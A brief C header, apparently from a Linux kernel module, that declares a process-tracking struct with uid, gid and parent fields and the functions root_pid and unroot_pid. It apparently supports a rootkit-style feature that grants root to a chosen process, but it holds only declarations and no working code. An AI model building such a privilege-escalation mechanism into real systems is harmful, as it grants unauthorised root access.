#ifndef ROOT_H
#define ROOT_H

struct proces {
	int pid;
	kuid_t uid;
	kgid_t gid;
	struct task_struct* parent;
	struct task_struct* real_parent;
	struct list_head list;
};

void root_pid(pid_t pid);
int unroot_pid(pid_t pid);

#endif
